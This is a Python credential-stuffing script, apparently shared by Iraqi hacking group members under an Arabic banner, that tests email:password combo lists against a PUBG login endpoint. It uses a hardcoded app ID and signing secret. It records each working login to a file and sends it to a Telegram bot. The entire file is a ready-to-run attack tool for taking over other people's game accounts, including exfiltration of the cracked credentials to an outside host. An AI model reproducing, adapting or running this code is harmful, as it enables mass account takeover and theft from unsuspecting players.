import requests
import uuid
import colorama 
import time 
import secrets
import random
import requests,hashlib,random,string,time
r = requests.session()
print("""
༺༻༺༻༺༻༺༻༺༻༺༻༺༻
            مطور حمزه التميمي 
            ﷲ
          فرقه كوابيس العراق 🇮🇶ﷲ
          
          اداة مدفوعه بس مجاني الكم ﷲ
          @m1Ezz            @KM084
༺༻༺༻༺༻༺༻༺༻༺༻༺༻༺          
        @KM084     @m1Ezz
""")
ID= input('[+] Enter YOUR ID : ')
token = input('[+] Enter TOKEN BOT : ')
headPUB = {
	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
def CHECK(email,pess):
  eml = email
  pas = pess
  YES = f"""
[✓] تم الصيد الحساب ببجي :
[✓] Email: {eml}
[✓] Pass: {pas}
━━━━━━━━━━━━━"""
  NO = f"""
[-] لا يوجد حساب :
[-] Email: {eml}
[-] Pass: {pas}
━━━━━━━━━━━━━"""
  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
  time.sleep(0.5)
  GO=r.get(url, data=daPU,headers=headPUB).text
  if '"token"' in GO:
    print(YES)
    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @m1Ezz @KM084 💸')
    with open('NWE-PUBG.txt', 'a') as x:
      x.write(eml+':'+pas+' |@KM084\n')
  else:
    print(NO)
def FILname():
  F = input('[+] Enter the name the combo file : ')
  try:
    for x in open(F,'r').read().splitlines():
      email = x.split(":")[0]
      pess = x.split(":")[1]
      CHECK(email,pess)
  except FileNotFoundError:
    print('\n[-] The file name is incorrect !\n')
    return FILname()
FILname()
